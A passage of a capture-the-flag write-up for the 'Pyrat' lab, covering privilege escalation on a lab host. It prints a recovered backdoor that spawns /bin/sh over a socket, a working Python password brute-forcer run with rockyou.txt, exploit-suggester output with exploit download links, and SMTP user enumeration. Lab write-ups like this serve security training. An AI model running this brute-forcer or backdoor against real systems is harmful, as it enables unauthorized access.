+</span></span><span class=line><span class=cl>REDACTED
+</span></span></code></pre></div><p>We got the first flag here.</p><h2 id=privilege-escalation>Privilege Escalation</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ git status
+</span></span><span class=line><span class=cl>On branch master
+</span></span><span class=line><span class=cl>Changes not staged <span class=k>for</span> commit:
+</span></span><span class=line><span class=cl>  <span class=o>(</span>use <span class=s2>&#34;git add/rm &lt;file&gt;...&#34;</span> to update what will be committed<span class=o>)</span>
+</span></span><span class=line><span class=cl>  <span class=o>(</span>use <span class=s2>&#34;git restore &lt;file&gt;...&#34;</span> to discard changes in working directory<span class=o>)</span>
+</span></span><span class=line><span class=cl>        deleted:    pyrat.py.old
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>no changes added to commit <span class=o>(</span>use <span class=s2>&#34;git add&#34;</span> and/or <span class=s2>&#34;git commit -a&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ git log
+</span></span><span class=line><span class=cl>commit 0a3c36d66369fd4b07ddca72e5379461a63470bf <span class=o>(</span>HEAD -&gt; master<span class=o>)</span>
+</span></span><span class=line><span class=cl>Author: Jose Mario &lt;josemlwdf@github.com&gt;
+</span></span><span class=line><span class=cl>Date:   Wed Jun <span class=m>21</span> 09:32:14 <span class=m>2023</span> +0000
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Added shell endpoint
+</span></span></code></pre></div><p>We can see the <code>Added shell endpoint</code> git commited status.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ git show                                                     
+</span></span><span class=line><span class=cl>commit 0a3c36d66369fd4b07ddca72e5379461a63470bf <span class=o>(</span>HEAD -&gt; master<span class=o>)</span>
+</span></span><span class=line><span class=cl>Author: Jose Mario &lt;josemlwdf@github.com&gt;
+</span></span><span class=line><span class=cl>Date:   Wed Jun <span class=m>21</span> 09:32:14 <span class=m>2023</span> +0000
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Added shell endpoint
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>diff --git a/pyrat.py.old b/pyrat.py.old
+</span></span><span class=line><span class=cl>new file mode <span class=m>100644</span>
+</span></span><span class=line><span class=cl>index 0000000..ce425cf
+</span></span><span class=line><span class=cl>--- /dev/null
+</span></span><span class=line><span class=cl>+++ b/pyrat.py.old
+</span></span><span class=line><span class=cl>@@ -0,0 +1,27 @@
+</span></span><span class=line><span class=cl>+...............................................
+</span></span><span class=line><span class=cl>+
+</span></span><span class=line><span class=cl>+def switch_case<span class=o>(</span>client_socket, data<span class=o>)</span>:
+</span></span><span class=line><span class=cl>+    <span class=k>if</span> <span class=nv>data</span> <span class=o>==</span> <span class=s1>&#39;some_endpoint&#39;</span>:
+</span></span><span class=line><span class=cl>+        get_this_enpoint<span class=o>(</span>client_socket<span class=o>)</span>
+</span></span><span class=line><span class=cl>+    <span class=k>else</span>:
+</span></span><span class=line><span class=cl>+        <span class=c1># Check socket is admin and downgrade if is not aprooved</span>
+</span></span><span class=line><span class=cl>+        <span class=nv>uid</span> <span class=o>=</span> os.getuid<span class=o>()</span>
+</span></span><span class=line><span class=cl>+        <span class=k>if</span> <span class=o>(</span><span class=nv>uid</span> <span class=o>==</span> 0<span class=o>)</span>:
+</span></span><span class=line><span class=cl>+            change_uid<span class=o>()</span>
+</span></span><span class=line><span class=cl>+
+</span></span><span class=line><span class=cl>+        <span class=k>if</span> <span class=nv>data</span> <span class=o>==</span> <span class=s1>&#39;shell&#39;</span>:
+</span></span><span class=line><span class=cl>+            shell<span class=o>(</span>client_socket<span class=o>)</span>
+</span></span><span class=line><span class=cl>+        <span class=k>else</span>:
+</span></span><span class=line><span class=cl>+            exec_python<span class=o>(</span>client_socket, data<span class=o>)</span>
+</span></span><span class=line><span class=cl>+
+</span></span><span class=line><span class=cl>+def shell<span class=o>(</span>client_socket<span class=o>)</span>:
+</span></span><span class=line><span class=cl>+    try:
+</span></span><span class=line><span class=cl>+        import pty
+</span></span><span class=line><span class=cl>+        os.dup2<span class=o>(</span>client_socket.fileno<span class=o>()</span>, 0<span class=o>)</span>
+</span></span><span class=line><span class=cl>+        os.dup2<span class=o>(</span>client_socket.fileno<span class=o>()</span>, 1<span class=o>)</span>
+</span></span><span class=line><span class=cl>+        os.dup2<span class=o>(</span>client_socket.fileno<span class=o>()</span>, 2<span class=o>)</span>
+</span></span><span class=line><span class=cl>+        pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>+    except Exception as e:
+</span></span><span class=line><span class=cl>+        send_data<span class=o>(</span>client_socket, e
+</span></span><span class=line><span class=cl>+
+</span></span><span class=line><span class=cl>+...............................................
+</span></span><span class=line><span class=cl><span class=o>(</span>END<span class=o>)</span>
+</span></span></code></pre></div><p>From the above data, we see that there is an endpoint in the shell, potentially for an admin user. If we provide <code>shell</code> as input to this endpoint, we will gain direct access to the operating system shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc pyrat.thm <span class=m>8000</span>
+</span></span><span class=line><span class=cl>admin
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>Hello
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>mypassword
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl><span class=m>12345</span>
+</span></span><span class=line><span class=cl><span class=m>123456789</span>
+</span></span><span class=line><span class=cl>admin
+</span></span><span class=line><span class=cl>Start a fresh client to begin.
+</span></span></code></pre></div><p>We need to find the password for admin to get the privileged shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>import socket
+</span></span><span class=line><span class=cl>import sys
+</span></span><span class=line><span class=cl>from pathlib import Path
+</span></span><span class=line><span class=cl>import <span class=nb>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def args_check<span class=o>()</span>:
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Check for valid command line arguments.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> len<span class=o>(</span>sys.argv<span class=o>)</span> !<span class=o>=</span> 4:
+</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;Usage: python newscript.py IP PORT WORDLIST&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>        sys.exit<span class=o>(</span>1<span class=o>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> sys.argv<span class=o>[</span>1<span class=o>]</span>, int<span class=o>(</span>sys.argv<span class=o>[</span>2<span class=o>])</span>, sys.argv<span class=o>[</span>3<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def create_socket<span class=o>(</span>ip, port<span class=o>)</span>:
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Create and connect a TCP socket to the specified IP and port.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>sock</span> <span class=o>=</span> socket.socket<span class=o>(</span>socket.AF_INET, socket.SOCK_STREAM<span class=o>)</span>
+</span></span><span class=line><span class=cl>    try:
+</span></span><span class=line><span class=cl>        sock.connect<span class=o>((</span>ip, port<span class=o>))</span>
+</span></span><span class=line><span class=cl>    except socket.error:
+</span></span><span class=line><span class=cl>        try:
+</span></span><span class=line><span class=cl>            <span class=nv>ip</span> <span class=o>=</span> socket.gethostbyname<span class=o>(</span>ip<span class=o>)</span>
+</span></span><span class=line><span class=cl>            sock.connect<span class=o>((</span>ip, port<span class=o>))</span>
+</span></span><span class=line><span class=cl>        except socket.error:
+</span></span><span class=line><span class=cl>            print<span class=o>(</span>f<span class=s2>&#34;Connection refused for {ip}:{port}&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>            sys.exit<span class=o>(</span>1<span class=o>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> sock
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def send_data<span class=o>(</span>sock, message<span class=o>)</span>:
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Send a message to the server and receive the response.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    sock.sendall<span class=o>((</span>message + <span class=s1>&#39;\n&#39;</span><span class=o>)</span>.encode<span class=o>(</span><span class=s2>&#34;utf-8&#34;</span><span class=o>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> sock.recv<span class=o>(</span>1024<span class=o>)</span>.decode<span class=o>(</span><span class=s2>&#34;utf-8&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def check_file_exists<span class=o>(</span>wordlist<span class=o>)</span>:
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Check if the specified wordlist file exists.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>file_path</span> <span class=o>=</span> Path<span class=o>(</span>wordlist<span class=o>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> not file_path.exists<span class=o>()</span>:
+</span></span><span class=line><span class=cl>        print<span class=o>(</span>f<span class=s2>&#34;The file {file_path} does not exist.&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>        sys.exit<span class=o>(</span>1<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def bruteforce<span class=o>(</span>ip, port, wordlist<span class=o>)</span>:
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Attempt to brute-force the password using the provided wordlist.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    print<span class=o>(</span>f<span class=s2>&#34;Brute force started...&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>    with open<span class=o>(</span>wordlist, <span class=s2>&#34;r&#34;</span><span class=o>)</span> as f:
+</span></span><span class=line><span class=cl>        <span class=k>for</span> password in f:
+</span></span><span class=line><span class=cl>            <span class=nv>password</span> <span class=o>=</span> password.strip<span class=o>()</span>  <span class=c1># Remove any trailing newline characters</span>
+</span></span><span class=line><span class=cl>            <span class=nv>sock</span> <span class=o>=</span> create_socket<span class=o>(</span>ip, port<span class=o>)</span>
+</span></span><span class=line><span class=cl>            send_data<span class=o>(</span>sock, <span class=s1>&#39;admin&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>            <span class=nv>response</span> <span class=o>=</span> send_data<span class=o>(</span>sock, password<span class=o>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;Password&#34;</span> not in response:
+</span></span><span class=line><span class=cl>                print<span class=o>(</span>f<span class=s2>&#34;Response for correct password: \&#34;{response.strip()}\&#34;&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>                print<span class=o>(</span>f<span class=s2>&#34;Password found: {password}&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>                <span class=nv>endtime</span><span class=o>=</span>time.time<span class=o>()</span>
+</span></span><span class=line><span class=cl>                print<span class=o>(</span>f<span class=s2>&#34;timetaken: {round((endtime - starttime),3)} secs&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span>
+</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;No valid passwords found.&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span>:
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nv>starttime</span> <span class=o>=</span>time.time<span class=o>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># Get the command line arguments: IP, PORT, and WORDLIST</span>
+</span></span><span class=line><span class=cl>    ip, port, <span class=nv>wordlist</span> <span class=o>=</span> args_check<span class=o>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># Check if the wordlist file exists</span>
+</span></span><span class=line><span class=cl>    check_file_exists<span class=o>(</span>wordlist<span class=o>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># Start the brute-force process</span>
+</span></span><span class=line><span class=cl>    bruteforce<span class=o>(</span>ip, port, wordlist<span class=o>)</span>
+</span></span></code></pre></div><p>We have created a bruteforcing python script to get admin password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python newscript.py pyrat.thm <span class=m>8000</span> /usr/share/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl>Brute force started...
+</span></span><span class=line><span class=cl>Response <span class=k>for</span> correct password: <span class=s2>&#34;Welcome Admin!!! Type &#34;</span>shell<span class=s2>&#34; to begin&#34;</span>
+</span></span><span class=line><span class=cl>Password found: abc123
+</span></span><span class=line><span class=cl>timetaken: 6.515 secs
+</span></span></code></pre></div><p>By using the above script we are able to crack the password for admin.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat /root/root.txt
+</span></span><span class=line><span class=cl>REDACTED
+</span></span></code></pre></div><p>We got the root flag by running the above command.</p><p>We solved the lab.</p><p>Happy Hacking !!! &#x1f60e;</p><h2 id=extras>Extras</h2><p>Here are the other enumerations I have completed.</p><h3 id=pyrat>Pyrat</h3><p>Check here for the orginal source code: <a href=https://github.com/josemlwdf/PyRAT target=_blank rel=noopener>PyRat</a></p><h3 id=linpeas>linpeas</h3><p>lets use <a href=https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh target=_blank rel=noopener>linpeas.sh</a>
+for getting privilege escalation vector.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╔══════════╣ Sudo version
+</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                              
+</span></span><span class=line><span class=cl>Sudo version 1.8.31
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>╔══════════╣ Executing Linux Exploit Suggester
+</span></span><span class=line><span class=cl>╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                           
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2022-2586<span class=o>]</span> nft_object UAF                                                                                                                           
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+</span></span><span class=line><span class=cl>   Exposure: probable
+</span></span><span class=line><span class=cl>   Tags: <span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=(</span>20.04<span class=o>)</span> <span class=o>]{</span>kernel:5.12.13<span class=o>}</span>
+</span></span><span class=line><span class=cl>   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+</span></span><span class=line><span class=cl>   Comments: kernel.unprivileged_userns_clone<span class=o>=</span><span class=m>1</span> required <span class=o>(</span>to obtain CAP_NET_ADMIN<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-4034<span class=o>]</span> PwnKit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+</span></span><span class=line><span class=cl>   Exposure: probable
+</span></span><span class=line><span class=cl>   Tags: <span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>10<span class=p>|</span>11<span class=p>|</span>12<span class=p>|</span>13<span class=p>|</span>14<span class=p>|</span>15<span class=p>|</span>16<span class=p>|</span>17<span class=p>|</span>18<span class=p>|</span>19<span class=p>|</span>20<span class=p>|</span><span class=m>21</span> <span class=o>]</span>,debian<span class=o>=</span>7<span class=p>|</span>8<span class=p>|</span>9<span class=p>|</span>10<span class=p>|</span>11,fedora,manjaro
+</span></span><span class=line><span class=cl>   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-3156<span class=o>]</span> sudo Baron Samedit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span></span><span class=line><span class=cl>   Exposure: probable
+</span></span><span class=line><span class=cl>   Tags: <span class=nv>mint</span><span class=o>=</span>19,<span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>18<span class=p>|</span><span class=m>20</span> <span class=o>]</span>, <span class=nv>debian</span><span class=o>=</span><span class=m>10</span>
+</span></span><span class=line><span class=cl>   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-3156<span class=o>]</span> sudo Baron Samedit <span class=m>2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span></span><span class=line><span class=cl>   Exposure: probable
+</span></span><span class=line><span class=cl>   Tags: <span class=nv>centos</span><span class=o>=</span>6<span class=p>|</span>7<span class=p>|</span>8,<span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>14<span class=p>|</span>16<span class=p>|</span>17<span class=p>|</span>18<span class=p>|</span>19<span class=p>|</span><span class=m>20</span> <span class=o>]</span>, <span class=nv>debian</span><span class=o>=</span>9<span class=p>|</span><span class=m>10</span>
+</span></span><span class=line><span class=cl>   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-22555<span class=o>]</span> Netfilter heap out-of-bounds write
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+</span></span><span class=line><span class=cl>   Exposure: probable
+</span></span><span class=line><span class=cl>   Tags: <span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>20.04 <span class=o>]{</span>kernel:5.8.0-*<span class=o>}</span>
+</span></span><span class=line><span class=cl>   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+</span></span><span class=line><span class=cl>   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+</span></span><span class=line><span class=cl>   Comments: ip_tables kernel module must be loaded
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2022-32250<span class=o>]</span> nft_object UAF <span class=o>(</span>NFT_MSG_NEWSET<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+</span></span><span class=line><span class=cl>https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+</span></span><span class=line><span class=cl>   Exposure: less probable
+</span></span><span class=line><span class=cl>   Tags: <span class=nv>ubuntu</span><span class=o>=(</span>22.04<span class=o>){</span>kernel:5.15.0-27-generic<span class=o>}</span>
+</span></span><span class=line><span class=cl>   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+</span></span><span class=line><span class=cl>   Comments: kernel.unprivileged_userns_clone<span class=o>=</span><span class=m>1</span> required <span class=o>(</span>to obtain CAP_NET_ADMIN<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2017-5618<span class=o>]</span> setuid screen v4.5.0 LPE
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://seclists.org/oss-sec/2017/q1/184
+</span></span><span class=line><span class=cl>   Exposure: less probable
+</span></span><span class=line><span class=cl>   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>╔══════════╣ Active Ports
+</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                            
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::22                   :::*                    LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::1:25                  :::*                    LISTEN      - 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>╔══════════╣ Searching root files in home <span class=nb>dirs</span> <span class=o>(</span>limit 30<span class=o>)</span>
+</span></span><span class=line><span class=cl>/home/                                                                                                                                                       
+</span></span><span class=line><span class=cl>/home/think/.bash_history
+</span></span><span class=line><span class=cl>/home/think/.viminfo
+</span></span><span class=line><span class=cl>/home/think/user.txt
+</span></span><span class=line><span class=cl>/root/
+</span></span></code></pre></div><p>Using <code>linpeas.sh</code> we got some interesting results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>think@Pyrat:~$ wget http://127.0.0.1:25/
+</span></span><span class=line><span class=cl>--2024-10-03 14:19:47--  http://127.0.0.1:25/
+</span></span><span class=line><span class=cl>Connecting to 127.0.0.1:25... connected.
+</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> No headers, assuming HTTP/0.9
+</span></span><span class=line><span class=cl>Length: unspecified
+</span></span><span class=line><span class=cl>Saving to: ‘index.html’
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>index.html                                  <span class=o>[</span> &lt;<span class=o>=</span>&gt;                                                                         <span class=o>]</span>     <span class=m>104</span>  --.-KB/s    in 0s      
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2024-10-03 14:19:47 <span class=o>(</span>16.3 MB/s<span class=o>)</span> - ‘index.html’ saved <span class=o>[</span>104<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>think@Pyrat:~$ cat index.html 
+</span></span><span class=line><span class=cl><span class=m>220</span> ubuntuserver.localdomain ESMTP Postfix <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>221</span> 2.7.0 Error: I can <span class=nb>break</span> rules, too. Goodbye.
+</span></span></code></pre></div><p>Checking <code>http://127.0.0.1:25</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>HELO localhost
+</span></span><span class=line><span class=cl><span class=m>250</span> ubuntuserver.localdomain
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>MAIL FROM:root@localhost
+</span></span><span class=line><span class=cl><span class=m>250</span> 2.1.0 Ok
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>vrfy root
+</span></span><span class=line><span class=cl><span class=m>252</span> 2.0.0 root
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>vrfy think
+</span></span><span class=line><span class=cl><span class=m>252</span> 2.0.0 think
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>STARTTLS
+</span></span><span class=line><span class=cl><span class=m>220</span> 2.0.0 Ready to start TLS
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ehlo localhost.com
+</span></span><span class=line><span class=cl>250-ubuntuserver.localdomain
+</span></span><span class=line><span class=cl>250-PIPELINING
+</span></span><span class=line><span class=cl>250-SIZE <span class=m>10240000</span>
+</span></span><span class=line><span class=cl>250-VRFY
+</span></span><span class=line><span class=cl>250-ETRN
+</span></span><span class=line><span class=cl>250-STARTTLS
+</span></span><span class=line><span class=cl>250-ENHANCEDSTATUSCODES
+</span></span><span class=line><span class=cl>250-8BITMIME
+</span></span><span class=line><span class=cl>250-DSN
+</span></span><span class=line><span class=cl>250-SMTPUTF8
+</span></span><span class=line><span class=cl><span class=m>250</span> CHUNKING
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>mail from:think@localhost
+</span></span><span class=line><span class=cl><span class=m>250</span> 2.1.0 Ok
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>MAIL FROM: me
+</span></span><span class=line><span class=cl><span class=m>250</span> 2.1.0 Ok
+</span></span></code></pre></div><p>Looking for useful information in <code>SMPT</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ nc -vn 127.0.0.1 <span class=m>25</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>127.0.0.1<span class=o>]</span> <span class=m>25</span> <span class=o>(</span>smtp<span class=o>)</span> open
+</span></span><span class=line><span class=cl><span class=m>220</span> ubuntuserver.localdomain ESMTP Postfix <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ nmap -p25 --script smtp-commands localhost
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>25/tcp open  smtp
+</span></span><span class=line><span class=cl><span class=p>|</span>_smtp-commands: ubuntuserver.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ nmap -p25 --script smtp-open-relay localhost
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>25/tcp open  smtp
+</span></span><span class=line><span class=cl><span class=p>|</span>_smtp-open-relay: Server doesn<span class=err>&#39;</span>t seem to be an open relay, all tests failed
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ nmap --script smtp-enum-users localhost -p25
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>25/tcp open  smtp
+</span></span><span class=line><span class=cl><span class=p>|</span> smtp-enum-users: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  root
+</span></span></code></pre></div><p>nmap on <code>port 25</code>.</p><p><figure><img src=/posts/pyrat/2.png title="Lets check the mail" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Lets check the mail</strong></figcaption></figure>While searching, in internet we got an interesting directory <code>/var/mail/</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>think@Pyrat:~$ ls -lah /var/mail/
+</span></span><span class=line><span class=cl>total 12K
+</span></span><span class=line><span class=cl>drwxrwsr-x  <span class=m>2</span> root mail 4.0K Jun <span class=m>21</span>  <span class=m>2023</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>12</span> root root 4.0K Dec <span class=m>22</span>  <span class=m>2023</span> ..
+</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root mail    <span class=m>9</span> Jun <span class=m>21</span>  <span class=m>2023</span> root -&gt; /dev/null
+</span></span><span class=line><span class=cl>-r--r--r--  <span class=m>1</span> root mail  <span class=m>617</span> Jun <span class=m>21</span>  <span class=m>2023</span> think
+</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root mail    <span class=m>9</span> Jun <span class=m>21</span>  <span class=m>2023</span> www-data -&gt; /dev/null
+</span></span></code></pre></div><p>Here file <code>/var/mail/think</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>think@Pyrat:/var/mail$ cat /var/mail/think 
+</span></span><span class=line><span class=cl>From root@pyrat  Thu Jun <span class=m>15</span> 09:08:55 <span class=m>2023</span>
+</span></span><span class=line><span class=cl>Return-Path: &lt;root@pyrat&gt;
+</span></span><span class=line><span class=cl>X-Original-To: think@pyrat
+</span></span><span class=line><span class=cl>Delivered-To: think@pyrat
+</span></span><span class=line><span class=cl>Received: by pyrat.localdomain <span class=o>(</span>Postfix, from userid 0<span class=o>)</span>
+</span></span><span class=line><span class=cl>        id 2E4312141<span class=p>;</span> Thu, <span class=m>15</span> Jun <span class=m>2023</span> 09:08:55 +0000 <span class=o>(</span>UTC<span class=o>)</span>
+</span></span><span class=line><span class=cl>Subject: Hello
+</span></span><span class=line><span class=cl>To: &lt;think@pyrat&gt;
+</span></span><span class=line><span class=cl>X-Mailer: mail <span class=o>(</span>GNU Mailutils 3.7<span class=o>)</span>
+</span></span><span class=line><span class=cl>Message-Id: &lt;20230615090855.2E4312141@pyrat.localdomain&gt;
